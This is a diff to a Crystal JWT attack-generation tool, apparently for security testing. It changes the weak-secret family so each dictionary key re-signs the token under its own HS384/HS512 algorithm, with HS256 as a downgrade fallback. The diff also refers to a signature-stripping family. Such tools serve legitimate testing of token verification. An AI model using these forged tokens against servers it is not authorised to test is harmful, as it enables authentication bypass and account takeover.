@@ -59,17 +59,35 @@ module Gori
         "2-part token — signature segment removed entirely")
     end
 
-    # --- family 2: weak-secret HS256 re-sign -------------------------------------
+    # --- family 2: weak-secret HS re-sign ----------------------------------------
     # Re-sign under each dictionary key; whichever the server accepts reveals its secret.
+    # The re-sign uses the token's OWN HS algorithm when it declares one, so an HS384/HS512
+    # token's payloads actually verify on a server that pins that alg — signing them HS256
+    # (the old hardcoded choice) made every weak-secret payload for a non-HS256 token fail
+    # the alg check regardless of the key, so the "verifies if the key is X" note was a lie
+    # there. A token that isn't HS* (none/RS/ES/PS) falls back to HS256: the classic
+    # downgrade-to-HMAC-with-a-weak-key probe.
     private def weak_secret_family(list, header, payload_seg : String) : Nil
+      alg = weak_secret_alg(header)
       WEAK_SECRETS.each do |secret|
         h = header.dup
-        h["alg"] = JSON::Any.new("HS256")
+        h["alg"] = JSON::Any.new(alg)
         signing_input = "#{b64url(h.to_json)}.#{payload_seg}"
         shown = secret.empty? ? "(empty)" : secret
-        list << Attack.new("HS256 secret=#{shown}", "weak-secret",
-          "#{signing_input}.#{sign(signing_input, "HS256", secret)}",
+        list << Attack.new("#{alg} secret=#{shown}", "weak-secret",
+          "#{signing_input}.#{sign(signing_input, alg, secret)}",
           "verifies if the server's HMAC key is #{secret.empty? ? "empty" : secret.inspect}")
+      end
+    end
+
+    # The HS algorithm to re-sign the weak-secret family under: the token's declared alg when
+    # it is one of the HMAC family (matched case-insensitively, emitted in canonical form), so
+    # the re-signs verify on a server that pins that alg; HS256 otherwise.
+    private def weak_secret_alg(header : Hash(String, JSON::Any)) : String
+      case header["alg"]?.try(&.as_s?).try(&.upcase)
+      when "HS384" then "HS384"
+      when "HS512" then "HS512"
+      else              "HS256"
       end
     end
 
